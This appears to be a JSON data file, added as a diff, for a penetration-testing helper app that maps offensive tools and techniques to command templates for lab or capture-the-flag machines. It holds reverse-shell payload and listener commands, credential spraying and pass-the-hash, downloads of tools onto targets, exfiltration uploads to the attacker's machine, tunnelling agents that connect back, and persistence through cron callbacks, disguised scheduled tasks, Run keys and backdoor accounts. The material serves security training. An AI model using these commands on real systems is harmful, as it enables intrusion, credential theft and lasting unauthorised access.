@@ -1,0 +1,570 @@
+{
+  "tools": [
+    {
+      "name": "searchsploit",
+      "description": "Offline Exploit-DB search and copy tool.",
+      "commands": [
+        {"purpose": "Search Exploit-DB for the product and version", "template": "searchsploit <product> <version>", "intent": "discover"},
+        {"purpose": "Copy an exploit into the working dir so you can read and edit it", "template": "searchsploit -m <edb-id>", "intent": "exploit"},
+        {"purpose": "Preview an exploit without copying it", "template": "searchsploit -x <edb-id>", "intent": "enumerate"}
+      ]
+    },
+    {
+      "name": "msfconsole",
+      "description": "Metasploit Framework console: search, use, set, run.",
+      "commands": [
+        {"purpose": "Start Metasploit quietly", "template": "msfconsole -q", "intent": "exploit"},
+        {"purpose": "Search for a module by product and version", "template": "search <product> <version>", "intent": "discover"},
+        {"purpose": "Load a module, point it at the target and your listener, then fire", "template": "use <module>; set RHOSTS {{TARGET}}; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run", "intent": "exploit"},
+        {"purpose": "Catch a Meterpreter/shell from a standalone payload", "template": "use exploit/multi/handler; set payload <payload>; set LHOST {{LHOST}}; set LPORT {{LPORT}}; run", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "msfvenom",
+      "description": "Standalone payload/shellcode generator.",
+      "commands": [
+        {"purpose": "List payloads for a platform", "template": "msfvenom -l payloads --platform <os>", "intent": "discover"},
+        {"purpose": "Generate a payload for the target OS and format (pick the exact payload, format and matching listener from the app's Reverse shells page)", "template": "msfvenom -p <payload> LHOST={{LHOST}} LPORT={{LPORT}} -f <format> -o <file>", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "netexec",
+      "description": "Network auth and command execution across SMB/WinRM/SSH/RDP/MSSQL (nxc).",
+      "commands": [
+        {"purpose": "Check a credential over SMB (watch for Pwn3d!)", "template": "nxc smb {{TARGET}} -u <user> -p <pass>", "intent": "authenticate"},
+        {"purpose": "Run a command over WinRM", "template": "nxc winrm {{TARGET}} -u <user> -p <pass> -x whoami", "intent": "exploit"},
+        {"purpose": "Check the same credential over other protocols", "template": "nxc ssh {{TARGET}} -u <user> -p <pass>", "intent": "authenticate"},
+        {"purpose": "Read the password policy before any spray", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --pass-pol", "intent": "enumerate"},
+        {"purpose": "Spray one credential across a subnet without stopping at the first hit", "template": "nxc smb <subnet> -u <user> -p <pass> --continue-on-success", "intent": "authenticate"},
+        {"purpose": "Authenticate with an NT hash instead of a password (pass-the-hash)", "template": "nxc smb {{TARGET}} -u <user> -H <hash>", "intent": "authenticate"}
+      ]
+    },
+    {
+      "name": "hydra",
+      "description": "Online login brute-forcer.",
+      "commands": [
+        {"purpose": "Brute-force SSH with one user and a wordlist", "template": "hydra -l <user> -P <wordlist> ssh://{{TARGET}}", "intent": "authenticate"},
+        {"purpose": "Brute-force FTP with user and password lists", "template": "hydra -L <users> -P <wordlist> ftp://{{TARGET}}", "intent": "authenticate"}
+      ]
+    },
+    {
+      "name": "ssh",
+      "description": "SSH client for login, key auth and tunnelling.",
+      "commands": [
+        {"purpose": "Log in with a password", "template": "ssh <user>@{{TARGET}}", "intent": "authenticate"},
+        {"purpose": "Log in with a recovered private key (key must be 0600)", "template": "chmod 600 <key>; ssh -i <key> <user>@{{TARGET}}", "intent": "authenticate"},
+        {"purpose": "Local forward: reach an internal port from Kali", "template": "ssh -L <port>:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot"},
+        {"purpose": "Remote forward: push a Kali port to the target's side", "template": "ssh -R <port>:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot"},
+        {"purpose": "Dynamic SOCKS proxy for proxychains", "template": "ssh -D 1080 <user>@{{TARGET}}", "intent": "pivot"}
+      ]
+    },
+    { "name": "evil-winrm", "description": "Interactive Windows shell over WinRM.", "commands": [
+      { "purpose": "Shell in with a username and password", "template": "evil-winrm -i {{TARGET}} -u <user> -p <pass>", "intent": "authenticate" },
+      { "purpose": "Shell in with an NT hash (pass-the-hash)", "template": "evil-winrm -i {{TARGET}} -u <user> -H <hash>", "intent": "authenticate" },
+      { "purpose": "In the session: upload a file from your Kali folder", "template": "upload <file>", "intent": "transfer" },
+      { "purpose": "In the session: download a file to your Kali folder", "template": "download <file>", "intent": "transfer" }
+    ] },
+    {
+      "name": "impacket-psexec",
+      "description": "SYSTEM shell via an SMB-installed service.",
+      "commands": [
+        {"purpose": "SYSTEM shell with credentials", "template": "impacket-psexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"},
+        {"purpose": "SYSTEM shell with an NT hash", "template": "impacket-psexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "impacket-wmiexec",
+      "description": "Semi-interactive shell over WMI (quieter than psexec).",
+      "commands": [
+        {"purpose": "Shell with credentials", "template": "impacket-wmiexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"},
+        {"purpose": "Shell with an NT hash", "template": "impacket-wmiexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "impacket-smbexec",
+      "description": "Command execution over SMB.",
+      "commands": [
+        {"purpose": "Shell with credentials", "template": "impacket-smbexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "impacket-smbserver",
+      "description": "Stand up an SMB share on Kali for file transfer.",
+      "commands": [
+        {"purpose": "Serve the current dir as share 'share' (SMB2 for modern Windows)", "template": "impacket-smbserver share $(pwd) -smb2support", "intent": "transfer"},
+        {"purpose": "Serve with credentials (Windows refuses guest SMB in many builds)", "template": "impacket-smbserver share $(pwd) -smb2support -user <user> -password <pass>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "xfreerdp3",
+      "description": "RDP client (FreeRDP 3, the xfreerdp3 command on current Kali).",
+      "commands": [
+        {"purpose": "Connect with clipboard and auto-resize", "template": "xfreerdp3 /v:{{TARGET}} /u:<user> /p:<pass> /cert:ignore +clipboard /dynamic-resolution", "intent": "authenticate"},
+        {"purpose": "Mount a local folder as a drive for transfers", "template": "xfreerdp3 /v:{{TARGET}} /u:<user> /p:<pass> /cert:ignore /drive:kali,/home/kali/share", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "hashid",
+      "description": "Identify a hash type and its hashcat mode.",
+      "commands": [
+        {"purpose": "Identify the likely hash type", "template": "hashid '<hash>'", "intent": "enumerate"},
+        {"purpose": "Show the matching hashcat mode numbers", "template": "hashid -m '<hash>'", "intent": "enumerate"}
+      ]
+    },
+    {
+      "name": "hashcat",
+      "description": "GPU password cracker.",
+      "commands": [
+        {"purpose": "Confirm a mode number by its example hash", "template": "hashcat --example-hashes | grep -iA2 <keyword>", "intent": "enumerate"},
+        {"purpose": "Crack NTLM (mode 1000)", "template": "hashcat -m 1000 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "exploit"},
+        {"purpose": "Crack NetNTLMv2 captures (mode 5600)", "template": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "exploit"},
+        {"purpose": "Crack any mode with a rules file", "template": "hashcat -m <mode> -a 0 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "intent": "exploit"},
+        {"purpose": "Show already-cracked results", "template": "hashcat -m <mode> <hashfile> --show", "intent": "enumerate"}
+      ]
+    },
+    {
+      "name": "john",
+      "description": "John the Ripper plus the *2john extractors.",
+      "commands": [
+        {"purpose": "Crack with rockyou", "template": "john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>", "intent": "exploit"},
+        {"purpose": "Crack forcing a specific format", "template": "john --format=<fmt> --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>", "intent": "exploit"},
+        {"purpose": "Turn an encrypted SSH key into a crackable hash", "template": "ssh2john <key> > hash.txt", "intent": "enumerate"},
+        {"purpose": "Turn a password-protected zip into a crackable hash", "template": "zip2john <file> > hash.txt", "intent": "enumerate"},
+        {"purpose": "Show the cracked password", "template": "john --show <hashfile>", "intent": "enumerate"}
+      ]
+    },
+    { "name": "cewl", "description": "Spiders a website and turns its words into a wordlist.", "commands": [
+      { "purpose": "Words of 5+ letters from the site, following links 2 deep", "template": "cewl http://{{DNS}} -d 2 -m 5 -w words.txt", "intent": "discover" },
+      { "purpose": "Also collect e-mail addresses (usernames)", "template": "cewl http://{{DNS}} -d 2 -e --email_file emails.txt -w words.txt", "intent": "discover" }
+    ] },
+    { "name": "username-anarchy", "description": "Turns full names into common username formats.", "commands": [
+      { "purpose": "Generate jsmith, john.smith and similar from a file of full names", "template": "username-anarchy --input-file names.txt > users.txt", "intent": "discover" }
+    ] },
+    {
+      "name": "nc",
+      "description": "Netcat: listeners and raw file transfer.",
+      "commands": [
+        {"purpose": "Listen for an incoming shell", "template": "nc -lvnp {{LPORT}}", "intent": "exploit"},
+        {"purpose": "Receive a file (run first on the receiving side)", "template": "nc -lvnp <port> > <file>", "intent": "transfer"},
+        {"purpose": "Send a file to a waiting listener", "template": "nc {{LHOST}} <port> < <file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "rlwrap",
+      "description": "Wrap a listener with readline (history, arrow keys).",
+      "commands": [
+        {"purpose": "Catch a shell with line editing and history", "template": "rlwrap nc -lvnp {{LPORT}}", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "pwncat-cs",
+      "description": "Listener that auto-stabilises the caught shell.",
+      "commands": [
+        {"purpose": "Catch and auto-upgrade a reverse shell", "template": "pwncat-cs -lp {{LPORT}}", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "socat",
+      "description": "Multipurpose relay: fully interactive catcher and port forward.",
+      "commands": [
+        {"purpose": "Catch a fully interactive shell (pair with a socat payload)", "template": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}", "intent": "exploit"},
+        {"purpose": "Forward a local port to an internal host", "template": "socat TCP-LISTEN:<port>,fork,reuseaddr TCP:<target>:<port>", "intent": "pivot"}
+      ]
+    },
+    {
+      "name": "python3",
+      "description": "Quick HTTP server and PTY helper.",
+      "commands": [
+        {"purpose": "Serve the current dir over HTTP", "template": "python3 -m http.server <port>", "intent": "transfer"},
+        {"purpose": "Spawn a PTY inside a dumb shell", "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "intent": "tune"}
+      ]
+    },
+    {
+      "name": "wget",
+      "description": "Download a file onto a Linux target.",
+      "commands": [
+        {"purpose": "Pull a file from your Kali HTTP server", "template": "wget http://{{LHOST}}:<port>/<file> -O <file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "curl",
+      "description": "Download or upload a file.",
+      "commands": [
+        {"purpose": "Pull a file from your Kali HTTP server", "template": "curl http://{{LHOST}}:<port>/<file> -o <file>", "intent": "transfer"},
+        {"purpose": "Upload a file back to Kali (needs an upload server)", "template": "curl -T <file> http://{{LHOST}}:<port>/", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "certutil",
+      "description": "Built-in Windows downloader.",
+      "commands": [
+        {"purpose": "Download a file onto a Windows target", "template": "certutil -urlcache -split -f http://{{LHOST}}:<port>/<file> <file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "powershell",
+      "description": "Windows download via Invoke-WebRequest or WebClient.",
+      "commands": [
+        {"purpose": "Download with Invoke-WebRequest (iwr)", "template": "powershell -c \"iwr http://{{LHOST}}:<port>/<file> -OutFile <file>\"", "intent": "transfer"},
+        {"purpose": "Download with Net.WebClient (older hosts)", "template": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{{LHOST}}:<port>/<file>','<file>')\"", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "bitsadmin",
+      "description": "Windows BITS downloader (legacy fallback).",
+      "commands": [
+        {"purpose": "Download a file onto a Windows target", "template": "bitsadmin /transfer job http://{{LHOST}}:<port>/<file> C:\\Windows\\Temp\\<file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "smbclient",
+      "description": "Interactive SMB client for pulling and pushing files.",
+      "commands": [
+        {"purpose": "Browse a share on the target", "template": "smbclient //{{TARGET}}/<share> -U <user>", "intent": "transfer"},
+        {"purpose": "Push a file to a Kali SMB share (exfil)", "template": "smbclient //{{LHOST}}/<share> -c 'put <file>'", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "ligolo-ng",
+      "description": "Reverse TUN pivot: route whole subnets through one agent.",
+      "commands": [
+        {"purpose": "One-time: create the ligolo TUN interface on Kali", "template": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up", "intent": "pivot"},
+        {"purpose": "Start the proxy on Kali with a self-signed cert", "template": "ligolo-proxy -selfcert", "intent": "pivot"},
+        {"purpose": "Run the agent on the compromised host (connects back)", "template": "./agent -connect {{LHOST}}:11601 -ignore-cert", "intent": "pivot"},
+        {"purpose": "In the proxy console: pick the agent session", "template": "session", "intent": "pivot"},
+        {"purpose": "On Kali: route the internal subnet through the tunnel, then type start in the console", "template": "sudo ip route add <subnet> dev ligolo", "intent": "pivot"},
+        {"purpose": "Relay an internal port back to Kali for a reverse shell", "template": "listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port>", "intent": "pivot"}
+      ]
+    },
+    {
+      "name": "chisel",
+      "description": "TCP/SOCKS tunnel over HTTP.",
+      "commands": [
+        {"purpose": "Run the server on Kali (reverse mode)", "template": "chisel server -p <port> --reverse", "intent": "pivot"},
+        {"purpose": "From the target: open a reverse SOCKS proxy", "template": "./chisel client {{LHOST}}:<port> R:socks", "intent": "pivot"},
+        {"purpose": "From the target: forward one internal port to Kali", "template": "./chisel client {{LHOST}}:<port> R:<port>:127.0.0.1:<port>", "intent": "pivot"}
+      ]
+    },
+    {
+      "name": "proxychains",
+      "description": "Route any TCP tool through a SOCKS proxy.",
+      "commands": [
+        {"purpose": "Point proxychains at your SOCKS port", "template": "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", "intent": "pivot"},
+        {"purpose": "Run a tool through the proxy (TCP connect scan only)", "template": "proxychains -q nmap -sT -Pn -p <port> <target>", "intent": "pivot"}
+      ]
+    },
+    {
+      "name": "sshuttle",
+      "description": "VPN-like routing of a subnet over plain SSH.",
+      "commands": [
+        {"purpose": "Route an internal subnet through an SSH host", "template": "sshuttle -r <user>@{{TARGET}} <subnet>", "intent": "pivot"}
+      ]
+    }
+  ],
+  "techniques": [
+    { "name": "Exploit a known vulnerability", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["version"], "yields": ["shell"], "when": "A service version matches a known CVE: read and run the Exploit-DB proof of concept, or use the matching Metasploit module.", "tools": ["searchsploit","msfconsole"], "commands": [
+      { "purpose": "Copy the exploit locally so you can read it before trusting it", "template": "searchsploit -m <edb-id>", "intent": "exploit" },
+      { "purpose": "Read the header for the exact version it hits and the LHOST/LPORT or URL to edit", "template": "head -40 <file>", "intent": "enumerate" }
+    ] },
+    {
+      "name": "Build a payload to deliver to the target",
+      "phase": "Initial Access",
+      "service": "any",
+      "applies": "any",
+      "needs": [],
+      "yields": [],
+      "when": "An exploit or a writable upload needs a standalone reverse-shell binary or script.",
+      "tools": ["msfvenom"],
+      "commands": [
+        {"purpose": "Pick the exact payload, format and matching listener on the app's Reverse shells page, then generate it", "template": "msfvenom -p <payload> LHOST={{LHOST}} LPORT={{LPORT}} -f <format> -o <file>", "intent": "exploit"}
+      ]
+    },
+    { "name": "Spray found credentials at the open services", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "You recovered a user and password and want every service on this box and the rest of the subnet it unlocks; check the lockout policy first.", "tools": ["netexec"], "commands": [
+      { "purpose": "Test the credential over each exposed protocol (smb, ssh, winrm, rdp, mssql) and watch for Pwn3d!", "template": "nxc <proto> {{TARGET}} -u <user> -p <pass>", "intent": "authenticate" }
+    ] },
+    {
+      "name": "Get an interactive Windows shell over WinRM",
+      "phase": "Initial Access",
+      "service": "winrm",
+      "applies": "windows",
+      "needs": ["creds"],
+      "yields": ["shell"],
+      "when": "Port 5985/5986 is open and your credential is in the Remote Management Users group.",
+      "tools": ["evil-winrm"],
+      "commands": []
+    },
+    {
+      "name": "Run commands on Windows over SMB or RPC",
+      "phase": "Initial Access",
+      "service": "smb",
+      "applies": "windows",
+      "needs": ["creds"],
+      "yields": ["admin"],
+      "when": "Your credential is a local admin on the box and you want a SYSTEM or admin shell.",
+      "tools": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
+      "commands": []
+    },
+    {
+      "name": "Open a desktop session over RDP",
+      "phase": "Initial Access",
+      "service": "rdp",
+      "applies": "windows",
+      "needs": ["creds"],
+      "yields": ["shell"],
+      "when": "Port 3389 is open and you want a GUI, clipboard and drive sharing.",
+      "tools": ["xfreerdp3"],
+      "commands": []
+    },
+    {
+      "name": "Log in over SSH with a password or found key",
+      "phase": "Initial Access",
+      "service": "ssh",
+      "applies": "linux",
+      "needs": ["creds"],
+      "yields": ["shell"],
+      "when": "You have a user and password, or a private key recovered from the box or a share.",
+      "tools": ["ssh"],
+      "commands": [
+        {"purpose": "A key must be 0600 or SSH refuses it", "template": "chmod 600 <key>; ssh -i <key> <user>@{{TARGET}}", "intent": "authenticate"}
+      ]
+    },
+    { "name": "Brute-force an SSH or FTP login", "phase": "Initial Access", "service": "ssh", "applies": "any", "needs": [], "yields": ["creds"], "when": "You have a valid username and the service allows unlimited attempts (lab only).", "tools": ["hydra"] },
+    { "name": "Build a custom wordlist", "phase": "Initial Access", "service": "any", "applies": "any", "needs": [], "yields": [], "when": "rockyou fails or you need usernames: build lists from the site's own words and from staff names found on the box.", "tools": ["cewl","username-anarchy"], "commands": [
+      { "purpose": "Mutate a short list with hashcat rules", "template": "hashcat --stdout -r /usr/share/hashcat/rules/best64.rule words.txt > mutated.txt", "intent": "tune" }
+    ] },
+    {
+      "name": "Identify a hash before cracking it",
+      "phase": "Initial Access",
+      "service": "any",
+      "applies": "any",
+      "needs": ["hash"],
+      "yields": [],
+      "when": "You pulled a hash and need its hashcat/john mode before wasting a run.",
+      "tools": ["hashid", "hashcat"],
+      "commands": [
+        {"purpose": "Common modes: NTLM 1000, NetNTLMv2 5600, MD5 0, sha512crypt 1800, Kerberoast RC4 13100, Kerberoast AES256 19700, AS-REP 18200", "template": "hashcat --example-hashes | grep -iB1 -A2 <keyword>", "intent": "enumerate"}
+      ]
+    },
+    { "name": "Crack a hash offline", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["hash"], "yields": ["creds"], "when": "You know the hash type and want the password: hashcat with rockyou and rules on a GPU, john on a CPU.", "tools": ["hashcat","john"] },
+    { "name": "Crack a password-protected file", "phase": "Initial Access", "service": "any", "applies": "any", "needs": [], "yields": ["creds"], "when": "A zip, rar, PDF, Office document, KeePass database or SSH key asks for a password: turn it into a hash with a *2john helper, then crack it.", "tools": ["john"], "commands": [
+      { "purpose": "RAR archive", "template": "rar2john <file> > hash.txt", "intent": "enumerate" },
+      { "purpose": "PDF document", "template": "pdf2john <file> > hash.txt", "intent": "enumerate" },
+      { "purpose": "Word, Excel or PowerPoint file", "template": "office2john <file> > hash.txt", "intent": "enumerate" },
+      { "purpose": "KeePass database", "template": "keepass2john <file> > hash.txt", "intent": "enumerate" }
+    ] },
+    {
+      "name": "Catch the reverse shell",
+      "phase": "Initial Access",
+      "service": "shell",
+      "applies": "any",
+      "needs": [],
+      "yields": ["shell"],
+      "when": "Your exploit or payload is set to call back to {{LHOST}}:{{LPORT}} (build the body on the Reverse shells page).",
+      "tools": ["nc", "rlwrap", "pwncat-cs"],
+      "commands": [
+        {"purpose": "Verify the listener is actually bound before you fire the payload", "template": "ss -tlnp | grep {{LPORT}}", "intent": "enumerate"}
+      ]
+    },
+    { "name": "Upgrade a dumb shell to a real TTY", "phase": "Initial Access", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": [], "when": "Your caught shell has no tab-complete or arrows, Ctrl-C kills it, or su and sudo complain about a terminal.", "tools": ["python3","socat"], "commands": [
+      { "purpose": "No Python? get a PTY with script", "template": "script -qc /bin/bash /dev/null", "intent": "tune" },
+      { "purpose": "Press Ctrl-Z, then on Kali: raw mode and bring the shell back", "template": "stty raw -echo; fg", "intent": "tune" },
+      { "purpose": "Back in the shell: reset, terminal type and size (match stty size on Kali)", "template": "reset; export TERM=xterm; stty rows 40 columns 160", "intent": "tune" }
+    ] },
+    {
+      "name": "Serve files from Kali to the target",
+      "phase": "Initial Access",
+      "service": "any",
+      "applies": "any",
+      "needs": [],
+      "yields": [],
+      "when": "You need to drop a tool, exploit or payload onto the box.",
+      "tools": ["python3", "impacket-smbserver"],
+      "commands": [
+        {"purpose": "HTTP server that also accepts uploads (pip install updog)", "template": "updog -p <port>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "Pull a file onto a Linux target",
+      "phase": "Initial Access",
+      "service": "shell",
+      "applies": "linux",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You have a Linux shell and a file waiting on your Kali server.",
+      "tools": ["wget", "curl", "nc"],
+      "commands": [
+        {"purpose": "Copy over SSH when you have creds", "template": "scp <file> <user>@{{TARGET}}:/tmp/<file>", "intent": "transfer"},
+        {"purpose": "No outbound HTTP? base64 on Kali, paste and decode on the target", "template": "base64 -w0 <file>   # then on target: echo <blob> | base64 -d > <file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "Pull a file onto a Windows target",
+      "phase": "Initial Access",
+      "service": "shell",
+      "applies": "windows",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You have a Windows shell and need a binary or script from Kali.",
+      "tools": ["certutil", "powershell", "bitsadmin"],
+      "commands": [
+        {"purpose": "Copy straight off a Kali SMB share", "template": "copy \\\\{{LHOST}}\\share\\<file> <file>", "intent": "transfer"}
+      ]
+    },
+    {
+      "name": "Exfil loot back to Kali",
+      "phase": "Initial Access",
+      "service": "shell",
+      "applies": "any",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You found a key, config or DB dump on the box and need it on Kali to crack or read.",
+      "tools": ["nc", "curl", "smbclient"],
+      "commands": []
+    },
+    { "name": "Route an internal subnet through a pivot", "phase": "Lateral Movement", "service": "shell", "applies": "any", "needs": ["shell"], "when": "You have a shell on a dual-homed host and want transparent access to its hidden subnet.", "yields": [], "tools": ["ligolo-ng"], "commands": [
+      { "purpose": "Full flow: create the tun once, start the proxy, run the agent on the host, pick the session, add the route, then type start", "template": "sudo ip route add <subnet> dev ligolo", "intent": "pivot" }
+    ] },
+    { "name": "Forward ports and SOCKS without SSH", "phase": "Lateral Movement", "service": "shell", "applies": "any", "needs": ["shell"], "yields": [], "when": "No TUN/root on the pivot, but you can run a binary and reach Kali over HTTP.", "tools": ["chisel"] },
+    { "name": "Forward ports and SOCKS over SSH", "phase": "Lateral Movement", "service": "ssh", "applies": "any", "needs": ["creds"], "yields": [], "when": "You have SSH creds on the pivot and want a port forward, a SOCKS proxy or (with sshuttle) the whole subnet, without dropping tools.", "tools": ["ssh","proxychains","sshuttle"] },
+    {
+      "name": "Forward a single internal port",
+      "phase": "Lateral Movement",
+      "service": "shell",
+      "applies": "any",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You only need one internal service reachable, not a full tunnel.",
+      "tools": ["socat"],
+      "commands": [
+        {"purpose": "Windows native port forward (admin)", "template": "netsh interface portproxy add v4tov4 listenport=<port> connectaddress=<target> connectport=<port>", "intent": "pivot"},
+        {"purpose": "Windows SSH tunnel with plink", "template": "plink.exe -R <port>:127.0.0.1:<port> <user>@{{LHOST}}", "intent": "pivot"}
+      ]
+    },
+    {
+      "name": "Map the internal network from your shell",
+      "phase": "Lateral Movement",
+      "service": "shell",
+      "applies": "any",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You have a foothold and need to know what else is reachable before pivoting.",
+      "tools": ["proxychains"],
+      "commands": [
+        {"purpose": "Interfaces, routes and neighbours reveal other subnets", "template": "ip a; ip route; arp -a; cat /etc/hosts", "intent": "discover"},
+        {"purpose": "Listening sockets and their owners (ss, or netstat on old boxes)", "template": "ss -tulpn", "intent": "discover"},
+        {"purpose": "Ping sweep a /24 (Linux)", "template": "for i in $(seq 1 254); do ping -c1 -W1 <subnet>.$i >/dev/null && echo <subnet>.$i up; done", "intent": "discover"},
+        {"purpose": "Ping sweep a /24 (Windows)", "template": "for /L %i in (1,1,254) do @ping -n 1 -w 100 <subnet>.%i | find \"TTL\"", "intent": "discover"},
+        {"purpose": "Once a SOCKS proxy is up, scan a host through it (TCP connect only)", "template": "proxychains -q nmap -sT -Pn -p- <target>", "intent": "discover"}
+      ]
+    },
+    {
+      "name": "Find and prove the flags",
+      "phase": "Root",
+      "service": "any",
+      "applies": "any",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "You have a shell and need user.txt, root.txt or proof.txt with context for the writeup.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Locate the flag files (Linux)", "template": "find / -name user.txt -o -name root.txt 2>/dev/null", "intent": "enumerate"},
+        {"purpose": "Locate the flag files (Windows)", "template": "where /r C:\\Users user.txt proof.txt root.txt", "intent": "enumerate"},
+        {"purpose": "Prove it with who and where you are (Linux)", "template": "id; hostname; ip -4 a | grep inet; cat /root/root.txt", "intent": "enumerate"},
+        {"purpose": "Prove it (Windows)", "template": "whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\root.txt", "intent": "enumerate"}
+      ]
+    },
+    {
+      "name": "Close out the box cleanly",
+      "phase": "Root",
+      "service": "any",
+      "applies": "any",
+      "needs": [],
+      "yields": [],
+      "when": "Both flags are in; tear down listeners and agents and record the box while it is fresh.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Stop your listeners and HTTP/SMB servers, then Ctrl-C the ligolo proxy and kill the agent", "template": "jobs; kill %1 %2", "intent": "tune"},
+        {"purpose": "Write the path, creds and flags into the box's Notes/Report tab in SlingSh0t", "template": "# no command: this is the writeup step", "intent": ""}
+      ]
+    },
+    {
+      "name": "Keep SSH access with your own key",
+      "phase": "Persistence",
+      "service": "ssh",
+      "applies": "linux",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "Lab re-entry: you control a user's home and want a key login that survives a password change.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Append your public key to the account", "template": "mkdir -p ~/.ssh; echo '<your-pubkey>' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Keep access with a cron job",
+      "phase": "Persistence",
+      "service": "shell",
+      "applies": "linux",
+      "needs": ["shell"],
+      "yields": [],
+      "when": "Lab re-entry: you want a scheduled callback (build the command on the Reverse shells page).",
+      "tools": [],
+      "commands": [
+        {"purpose": "Add a minute-ly callback to the current user's crontab", "template": "(crontab -l 2>/dev/null; echo '* * * * * <reverse-shell-command>') | crontab -", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Add a Linux user with sudo",
+      "phase": "Persistence",
+      "service": "shell",
+      "applies": "linux",
+      "needs": ["admin"],
+      "yields": [],
+      "when": "Lab re-entry: you are root and want a second administrative account.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Create the user and put it in the sudo group", "template": "useradd -m -s /bin/bash <user>; passwd <user>; usermod -aG sudo <user>", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Add a Windows local admin account",
+      "phase": "Persistence",
+      "service": "shell",
+      "applies": "windows",
+      "needs": ["admin"],
+      "yields": [],
+      "when": "Lab re-entry: you have admin and want a second account in the local Administrators group.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Create the account and add it to local admins", "template": "net user <user> <pass> /add & net localgroup Administrators <user> /add", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Keep access with a scheduled task",
+      "phase": "Persistence",
+      "service": "shell",
+      "applies": "windows",
+      "needs": ["admin"],
+      "yields": [],
+      "when": "Lab re-entry: you want Windows to run a callback at logon (command body on the Reverse shells page).",
+      "tools": [],
+      "commands": [
+        {"purpose": "Register a task that runs at logon as SYSTEM", "template": "schtasks /create /tn Updater /tr \"<command>\" /sc onlogon /ru SYSTEM", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Keep access with a Run key or service",
+      "phase": "Persistence",
+      "service": "shell",
+      "applies": "windows",
+      "needs": ["admin"],
+      "yields": [],
+      "when": "Lab re-entry: a registry Run key (per-user) or a new service (needs admin) relaunches your callback.",
+      "tools": [],
+      "commands": [
+        {"purpose": "Per-user Run key", "template": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"<command>\"", "intent": "exploit"},
+        {"purpose": "Or install an auto-start service (admin)", "template": "sc create updatesvc binPath= \"<command>\" start= auto", "intent": "exploit"}
+      ]
+    }
+  ]
+}
